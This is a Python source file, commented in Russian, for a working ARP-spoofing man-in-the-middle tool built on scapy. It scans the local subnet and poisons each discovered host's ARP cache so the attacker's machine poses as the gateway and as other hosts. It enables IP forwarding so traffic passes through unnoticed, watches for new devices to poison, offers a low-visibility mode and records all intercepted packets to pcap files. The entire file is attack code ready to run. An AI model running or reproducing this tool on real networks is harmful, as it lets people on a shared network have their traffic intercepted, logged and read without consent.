import threading
import time
import subprocess
import argparse
from scapy.all import *
import queue
from queue import Empty

from scapy.layers.dhcp import DHCP
from scapy.layers.inet import IP
from scapy.layers.l2 import ARP, Ether
from scapy.utils import PcapWriter
import os
import sys
from rich.progress import Progress

import keyboard
import logging as log
from datetime import datetime

verbose_enabled = True
bidirectional = True
rotate_output_len = 0
PID = os.getpid()

LOG_FILENAME = datetime.now().strftime('logfile_%H_%M_%S_%d_%m_%Y.log')
log.basicConfig(level=log.INFO, filename=LOG_FILENAME, filemode="w", format="%(asctime)s %(levelname)s %(message)s")

def check_privileges():
    if not os.environ.get("SUDO_UID") and os.geteuid() != 0:
        raise PermissionError("You need to run this script with sudo or as root.")


def get_default_if():
    if_list = get_if_list()
    if_dic = IFACES.data
    for item in if_list:
        if if_dic[item].name != "lo":
            return if_dic[item].name
        

def on_key_press(event):
    if event.name == 'q' or event.name == 'Q':
        if verbose_enabled:
            print('Exiting program...')
        else:
            log.info('Exiting program...')
        keyboard.unhook_all()
        global PID
        os.system(f"sudo kill -9 {PID} > /dev/null")


def arp_spoof(spoof_mac, victim_ip, victim_mac, target_ip, target_mac):
    """
  Функция для ARP-подделки.

  ARP packet configuration:
  op = 1: -- "who has pdst tell psrc" ("ip is at mac"), при отправлении пакета psrc и hwsrc не используются!
  пакет летит к target ip адресу (заранее разрешит его по arp-у сам)

  op = 2: -- "psrc адрес is at hwsrc" ("ip is at mac"), при отправлении пакета pdst и hwdst не используются!
  пакет летит к target ip адресу (заранее разрешит его по arp-у сам (если не прописан заголовок Ethernet))
  """
    if target_ip != "0.0.0.0" and target_ip != "255.255.255.255":
        arp_to_victim_packet = Ether(dst=victim_mac) / ARP(op=2, psrc=target_ip, hwsrc=spoof_mac, hwdst=victim_mac)
        sendp(arp_to_victim_packet, verbose=0, count=2)

    if bidirectional:
        if victim_ip != "0.0.0.0" and victim_ip != "255.255.255.255":
            arp_to_target_packet = Ether(dst=target_mac) / ARP(op=2, psrc=victim_ip, hwsrc=spoof_mac, hwdst=target_mac)
            sendp(arp_to_target_packet, verbose=0, count=2)

    if verbose_enabled:
        print(f"Был перехвачен кадр от {victim_ip} ({victim_mac}) -> к {target_ip} ({target_mac})")
        print(
            f"После искажения: Отправитель кадра думает, что: {target_ip} ({target_mac}) это {target_ip} ({spoof_mac})")
        if bidirectional:
            print(
                f"                 Получатель кадра  думает, что: {victim_ip} ({victim_mac}) это {victim_ip} ({spoof_mac})")
        # print(f"Для этого Отправителю был выслан кадр:", arp_to_victim_packet.show())
        # if bidirectional:
        #     print(f"Для этого Получателю был выслан кадр:", arp_to_target_packet.show())
    else:
        log.info(f"Send spoof that {target_ip} ({target_mac}) is {target_ip} ({spoof_mac})")
        if bidirectional:
            log.info(f"Send spoof that {victim_ip} ({victim_mac}) is {victim_ip} ({spoof_mac})")

class Sniffer:
    def __init__(self, interface="eth0", queue=None, pcap_name="", rotate_output_len=0):
        self.interface = interface
        self.queue = queue
        self.pcap_name = pcap_name
        self.rotate_output_len = rotate_output_len
        self.spoof_mac = get_if_hwaddr(self.interface)
        self.known_ips = []
        self.spoof_ip = get_if_addr(self.interface)
        

    def sniff_and_find_new_devices(self):
        """
        Функция для поиска новых устройств по DHCP и ARP,
        записи трафика в .pcap файл и передачи данных в очередь.
        """
        # Запись трафика в pcap файл
        if self.pcap_name != "":
            self.file_num = 1
            #pcap = str(pcap_name.partition("."))[0]
            self.pcap_name_real = datetime.now().strftime(f'{self.pcap_name}_%H_%M_%S_%d_%m_%Y.pcap')
            self.pktdump = PcapWriter(self.pcap_name_real, append=True, sync=True)
            self.last_check_time = time.time()
        if self.rotate_output_len != 0:
            self.log_filename = LOG_FILENAME
            self.log_file_num = 1
        while True:
            try:
                # Начинаем захват пакетов
                sniff(prn=self.packet_handler, iface=self.interface, store=0)
            except OSError as e:
                if verbose_enabled:
                    print(f"Ошибка сети: {e}")
                else:
                    log.error(f"Net error: {e}")
                restart_network_service()
                # Повторно пробуем инициализировать сетевой интерфейс
                try:
                    restart_network_interface(self.interface)
                    if verbose_enabled:
                        print(f"Сетевой интерфейс '{self.interface}' активирован.")
                    else:
                        log.error(f"Interface '{self.interface}' activated.")
                except OSError as e:
                    if verbose_enabled:
                        print(f"Ошибка: Не удалось активировать сетевой интерфейс '{self.interface}'")
                    else:
                        log.error(f"Error: Unable to activate net interface '{self.interface}'")
                    time.sleep(5)  # Ожидание перед попыткой перезапуска

        # Функция для обработки пакетов
    def packet_handler(self, packet):
        #nonlocal queue
        

        if packet.haslayer(DHCP):
            victim_ip = packet[IP].src if packet.haslayer(IP) else packet[ARP].psrc
            target_ip = packet[IP].dst if packet.haslayer(IP) else packet[ARP].pdst

            if target_ip not in self.known_ips:
                self.known_ips.append(target_ip)
            if victim_ip not in self.known_ips:
                self.known_ips.append(victim_ip)
            pass # to avoid eternal reconnecting
        elif packet.haslayer(ARP):
            # Извлекаем IP и MAC адреса
            if packet[ARP].op == 2:
                victim_ip = packet[ARP].psrc
                victim_mac = packet[ARP].hwsrc

                target_ip =  packet[ARP].pdst
                target_mac = packet[ARP].hwdst

                # Проверяем, является ли устройство новым
                if target_ip not in self.queue.queue: 
                    # Добавляем устройство в очередь
                    self.queue.put((victim_ip, victim_mac))
                    self.queue.put((target_ip, target_mac))

                    if target_ip != self.spoof_ip and victim_ip != self.spoof_ip and target_mac != self.spoof_mac and victim_mac != self.spoof_mac:
                        arp_spoof(self.spoof_mac, victim_ip, victim_mac, target_ip, target_mac)

                    if target_ip not in self.known_ips:
                        self.known_ips.append(target_ip)
                    if victim_ip not in self.known_ips:
                        self.known_ips.append(victim_ip)

            elif packet[ARP].op == 1 and packet[ARP].pdst in self.known_ips:
                victim_ip = packet[ARP].psrc
                victim_mac = packet[ARP].hwsrc

                target_ip =  packet[ARP].pdst
                target_mac = packet[ARP].hwdst

                # Проверяем, является ли устройство новым
                if target_ip not in self.queue.queue: 
                    # Добавляем устройство в очередь
                    self.queue.put((victim_ip, victim_mac))
                    self.queue.put((target_ip, target_mac))

                    if target_ip != self.spoof_ip and victim_ip != self.spoof_ip and target_mac != self.spoof_mac and victim_mac != self.spoof_mac:
                        arp_spoof(self.spoof_mac, victim_ip, victim_mac, target_ip, target_mac)
            

        elif packet.haslayer(IP):
            victim_ip = packet[IP].src if packet.haslayer(IP) else packet[ARP].psrc
            victim_mac = packet[ARP].hwsrc if packet.haslayer(ARP) else packet[Ether].src

            target_ip = packet[IP].dst if packet.haslayer(IP) else packet[ARP].pdst
            target_mac = packet[ARP].hwdst if packet.haslayer(ARP) else packet[Ether].dst

            if str(target_ip).rpartition(".")[0] == str(self.spoof_ip).rpartition(".")[0] and str(target_ip) != str(self.spoof_ip):
                if target_mac != "ff:ff:ff:ff:ff:ff" and target_mac != "00:00:00:00:00:00" and target_ip != "255.255.255.255" and target_ip != "0.0.0.0":
                    if target_ip not in self.queue.queue:
                        self.queue.put((target_ip, target_mac))
                        self.queue.put((target_ip, target_mac))
                        if target_ip not in self.known_ips:
                            self.known_ips.append(target_ip)

            if str(victim_ip).rpartition(".")[0] == str(self.spoof_ip).rpartition(".")[0] and str(victim_ip) != str(self.spoof_ip):
                if victim_mac != "ff:ff:ff:ff:ff:ff" and victim_mac != "00:00:00:00:00:00" and victim_ip != "255.255.255.255" and victim_ip != "0.0.0.0":
                    if victim_ip not in self.queue.queue:
                        self.queue.put((victim_ip, victim_mac))
                        self.queue.put((victim_ip, victim_mac))

                        if victim_ip not in self.known_ips:
                            self.known_ips.append(victim_ip)
        

        # Записываем пакет в pcap файл
        if self.pcap_name != "":
            self.pktdump.write(packet)
            if self.rotate_output_len != 0:
                if time.time() - self.last_check_time >= 300: # Проверяем каждые 5 минут
                    try:
                        statinfo = os.stat(self.pcap_name_real)
                        if statinfo.st_size >= (self.rotate_output_len):
                            self.pktdump.close()
                            self.file_num += 1
                            self.pcap_name_real = datetime.now().strftime(f'{self.pcap_name}_%H_%M_%S_%d_%m_%Y_rotated_{self.file_num}.pcap')
                            
                            self.pktdump = PcapWriter(self.pcap_name_real, append=True, sync=True)
                            log.info(f"PCAP file rotated, new one is {self.pcap_name_real}")
                        
                        statinfo = os.stat(self.log_filename)
                        if statinfo.st_size >= (self.rotate_output_len):
                            log.shutdown()

                            self.log_filename = datetime.now().strftime(f'logfile_%H_%M_%S_%d_%m_%Y_rotated_{self.log_file_num}.log')

                            self.log_file_num += 1
                            log.info(f"LOG file rotated, new one is {self.log_filename}")
                            
                            log.basicConfig(level=logging.INFO, filename=self.log_filename, filemode="w",
                                    format="%(asctime)s %(levelname)s %(message)s")
                            log.info(f"LOG file rotated, new one is {self.log_filename}")
                        
                        self.last_check_time = time.time()
                    except FileNotFoundError:
                        print(f"Error: File not found. Please ensure the directory exists.")
                    except OSError as e:
                        print(f"An OS error occurred: {e}")
                    except Exception as e:
                        print(f"An unexpected error occurred: {e}")


def restart_network_service():
    """
  Функция для перезапуска сетевой службы Linux Networking.
  """
    try:
        subprocess.run(["systemctl", "restart", "networking"])
        if verbose_enabled:
            print("Сетевая служба перезапущена.")
        else:
            log.error("Net service restarted.")
    except FileNotFoundError:
        if verbose_enabled:
            print("Ошибка: systemctl не найден.")
        else:
            log.error("Error: systemctl not found.")


def restart_network_interface(interface):
    """
  Функция для перезапуска рабочего интерфейса.
  """
    try:
        subprocess.run(["ifconfig", interface, "down"])
        subprocess.run(["ifconfig", interface, "up"])
        if verbose_enabled:
            print("Сетевой интерфейс перезапущен.")
        else:
            log.error("Interface restarted.")
    except FileNotFoundError as e:
        if verbose_enabled:
            print(f"Ошибка: {e}")
        else:
            log.error(f"Error: {e}")


def get_gateway_mac(gateway):
    arp_packet = ARP(op=1, pdst=gateway, hwdst="ff:ff:ff:ff:ff:ff")
    ans = sr1(arp_packet, verbose=0)
    return ans.hwsrc


def network_arp_discovery(interface="eth0", gateway_ip="", gateway_mac=""):
    """
    Функция для изучения функционирующих в сети устройств, путем массовой отправки ARP-запросов,
            а также для подмены всем найденным устройствам информации о gateway.
    """
    # IP-адрес сети (например, 192.168.1.0/24)
    network = str(get_if_addr(interface)).rpartition(".")[0] + ".0/24"
    spoof_ip = get_if_addr(interface)
    spoof_mac = get_if_hwaddr(interface)

    global verbose_enabled
    __verbose_state = verbose_enabled
    verbose_enabled = False

    local_ips = []

    if __verbose_state == True:
        with Progress() as progress:
            print(f"Изучаю локальную подсеть {network}...")
            task = progress.add_task(f"[red]Изучаю локальную подсеть {network}...", total=255)
            for i in range(1, 255):
                target_ip = str(get_if_addr(interface)).rpartition(".")[0] + f".{i}"
                progress.update(task, description=f"[red]Отправляю ARP-запрос на  {target_ip}")
                arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",
                                                                  psrc=spoof_ip, hwsrc=spoof_mac)

                ans, unans = srp(arp_packet, timeout=0.3, verbose=0)
                if gateway_ip != "":
                    for sent, received in ans:
                        arp_spoof(spoof_mac, received.psrc, received.hwsrc, gateway_ip, gateway_mac)

                progress.update(task, advance=1)
        os.system("clear")
    else:
        log.info(f"Studying local network {network}...")
        for i in range(1, 255):
            target_ip = str(get_if_addr(interface)).rpartition(".")[0] + f".{i}"
            arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",
                                                              psrc=spoof_ip, hwsrc=spoof_mac)

            ans, unans = srp(arp_packet, timeout=0.3, verbose=0)
            log.info(f"Sent arp to {target_ip}")
            if gateway_ip != "":
                for sent, received in ans:
                    arp_spoof(spoof_mac, received.psrc, received.hwsrc, gateway_ip, gateway_mac)
                    log.info(f"Have arp answ that {target_ip} is at {received.hwsrc}")
                    log.info(f"Send spoof to {target_ip} that we are gateway {gateway_ip}")
                    local_ips.append(received.psrc)
    verbose_enabled = __verbose_state
    if verbose_enabled:
        print('Press \"q\" to exit program\n')
    return local_ips


def main():
    check_privileges()
    default_if = get_default_if()
    # default_gateway = str(get_if_addr(default_if)).rpartition(".")[0] + ".1"

    os.system("sysctl -w net.ipv4.ip_forward=1 > /dev/null")
    log.info("Activated port forwarding")

    parser = argparse.ArgumentParser(description="ARP-подделка с обнаружением новых устройств.")
    if len(sys.argv) == 1:
        parser.print_help()
        return
    parser.add_argument("-i", "--interface", type=str, help="Название сетевого интерфейса. Ex. eth0",
                        default=default_if, required=True)
    parser.add_argument("-g", "--gateway", type=str, help="Ip-адрес роутера", default="")
    parser.add_argument("-w", type=str, help="Файл для записи перехваченных пакетов", default="")
    parser.add_argument("-v", "--verbose", type=str, help="Включение расширенного вывода (True/False)", default="False")
    parser.add_argument("-q", "--quiet_mode", type=str,
                        help="Включение режима минимальной заметности в сети (True/False)",
                        default="False")
    parser.add_argument("--rotate_output_len", type=int,
                        help="Включение режима ротации выходных файлов и определение максимального размера файла (количество Мега байт)",
                        default="0")

    args = parser.parse_args()

    # Получаем параметры из командной строки
    interface = args.interface
    spoof_ip = get_if_addr(interface)
    spoof_mac = get_if_hwaddr(interface)
    gateway_ip = args.gateway
    if gateway_ip != "":
        gateway_mac = get_gateway_mac(gateway_ip)

    pcap_name = args.w
    global verbose_enabled
    verbose_enabled = True if str(args.verbose).lower() == 'true' else False
    quiet_mode = True if str(args.quiet_mode).lower() == 'true' else False
    global rotate_output_len
    rotate_output_len = int(args.rotate_output_len) * 1024 * 1024 # В Мбайтах

    log.info(f"Got arguments: interface={interface}, spoof_ip={spoof_ip}, spoof_mac={spoof_mac}, gateway_ip={gateway_ip}, gateway_mac={gateway_mac},pcap_name={pcap_name}, verbose_enabled={verbose_enabled}, quiet_mode={quiet_mode}, rotate_output_len={rotate_output_len}")
    
    if quiet_mode:
        renew_arp_spoof_time = 30 # количество секунд до переотправки в эфир подделки собой всех найденных локальных ip (по желанию может быть вынесено в атрибуты командной строки)
    else:
        renew_arp_spoof_time = 2
    
    # Создаем очередь для передачи данных
    queue = Queue()

    sniffer = Sniffer(interface, queue, pcap_name, rotate_output_len)

    # Запускаем параллельный процесс для сканирования
    sniff_thread = threading.Thread(target=sniffer.sniff_and_find_new_devices, args=())
    sniff_thread.daemon = True  # Делаем поток фоновым
    sniff_thread.start()
    log.info("Started sniffing thread")
    time.sleep(1)

    if verbose_enabled:
        keyboard.on_press(on_key_press)
        print('Press \"q\" to exit program\n')

    # Словарь для хранения времени последней ARP-подделки для каждого устройства
    last_spoof_time = {}
    old_list = []
    global_resend_time = 0


    if gateway_ip != "":
        old_list += network_arp_discovery(interface, gateway_ip, gateway_mac)
        if gateway_ip not in old_list:
            old_list.append(gateway_ip)
        last_spoof_time[gateway_ip] = time.time()
    else:
        old_list += network_arp_discovery(interface)
    log.info(f"Studying local network gave us devices: {old_list}")

    while True:
        try:
            '''
            Отслеживаем устройства-получатели пакетов/те о которых спрашивают в сети.
            При обнаружении ARP/DHCP-пакета сообщаем в сети, что MAC-адрес получателя = MAC-адрес атакующего устройства 
            (в случае двунаправленной атаки также сообщаем в сети, что MAC-адрес отправителя = MAC-адрес атакующего устройства),
            после чего сохраняем информацию о подмененном устройстве-получателя в массив, для предупреждения постоянной отправки подменных пакетов, 
            так как в ближайшее время все устройства в сети и так будут помнить о нашей подмене.
            '''
            # Извлекаем данные из очереди
            victim_ip, victim_mac = queue.get(timeout=1)
            target_ip, target_mac = queue.get(timeout=1)
            #print("got a packet!!!")
            if target_ip != spoof_ip and victim_ip != spoof_ip and target_mac != spoof_mac and victim_mac != spoof_mac:
                if target_ip not in old_list:
                    # Добавляем запрашиваемое устройство в очередь
                    old_list.append(target_ip)
                    log.info(f"Found new ip, my ip_base is know {old_list}")
                    # Отправляем ARP-подделку для нового запрашиваемого устройства сразу
                    arp_spoof(spoof_mac, victim_ip, victim_mac, target_ip, target_mac)
                    last_spoof_time[target_ip] = time.time()
                else:
                    # Проверяем время последней ARP-подделки для этого устройства
                    if target_ip in last_spoof_time and time.time() - last_spoof_time[target_ip] >= 15:
                        # Отправляем ARP-подделку, если прошло более 15 секунд
                        arp_spoof(spoof_mac, victim_ip, victim_mac, target_ip, target_mac)
                        last_spoof_time[target_ip] = time.time()
            if time.time() - global_resend_time >= renew_arp_spoof_time:
                # Переотправка в эфир подделки собой всех найденных локальных ip
                log.info(f"Gone 2 minutes, resending arp spoof to all known {old_list}")
                for i in range(len(old_list)):
                    arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=old_list[i], hwsrc=spoof_mac, hwdst="ff:ff:ff:ff:ff:ff")
                    log.info(f"Resent arp spoof about {old_list[i]}")
                    sendp(arp_packet, verbose=0, count=3)
                    global_resend_time = time.time()
        except Empty:
            # Ожидаем новые данные
            if time.time() - global_resend_time >= renew_arp_spoof_time:
                # Переотправка в эфир подделки собой всех найденных локальных ip
                log.info(f"Gone 2 minutes, resending arp spoof to all known {old_list}")
                for i in range(len(old_list)):
                    arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=old_list[i], hwsrc=spoof_mac, hwdst="ff:ff:ff:ff:ff:ff")
                    log.info(f"Resent arp spoof about {old_list[i]}")
                    sendp(arp_packet, verbose=0, count=3)
                    global_resend_time = time.time()
            pass
        except OSError as e:
            if verbose_enabled:
                print(f"Ошибка сети: {e}")
            else:
                log.error(f"Net error: {e}")
            restart_network_service()
            # Повторно пробуем инициализировать сетевой интерфейс
            try:
                restart_network_interface(interface)
                if verbose_enabled:
                    print(f"Сетевой интерфейс '{interface}' активирован.")
                else:
                    log.error(f"Net interface '{interface}' activated.")
            except OSError as e:
                if verbose_enabled:
                    print(f"Ошибка: Не удалось активировать сетевой интерфейс '{interface}'")
                else:
                    log.error(f"Error: Unable to activate net interface '{interface}'")
                time.sleep(5)  # Ожидание перед попыткой перезапуска


if __name__ == "__main__":
    main()
    
